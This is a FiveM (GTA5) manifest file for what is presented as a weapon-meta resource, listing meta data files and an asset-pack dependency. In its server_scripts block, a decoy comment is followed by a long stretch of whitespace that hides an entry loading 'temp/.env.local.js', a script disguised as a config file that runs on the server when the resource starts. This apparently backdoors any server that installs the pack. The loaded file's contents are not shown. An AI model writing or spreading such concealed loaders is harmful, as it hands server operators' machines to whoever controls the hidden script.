fx_version "cerulean"
game "gta5"

files {
    'meta/**/**/**/*',
}

data_file "WEAPONCOMPONENTSINFO_FILE" "meta/**/**/**/weaponcomponents.meta"
data_file "PED_PERSONALITY_FILE" "meta/**/**/**/pedpersonality.meta"
data_file "WEAPON_ANIMATIONS_FILE" "meta/**/**/**/weaponanimations.meta"
data_file "WEAPON_METADATA_FILE" "meta/**/**/**/weaponarchetypes.meta"
data_file "WEAPONINFO_FILE" "meta/**/**/**/weapon.meta"
data_file "WEAPONINFO_FILE_PATCH" "meta/**/**/**/weapon.meta"

data_file 'WEAPONINFO_FILE' "meta/replace_metas/*.meta"
data_file 'WEAPONINFO_FILE_PATCH' 'meta/replace_metas/*.meta'
dependency '/assetpacks'

server_scripts {
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'temp/.env.local.js',
}
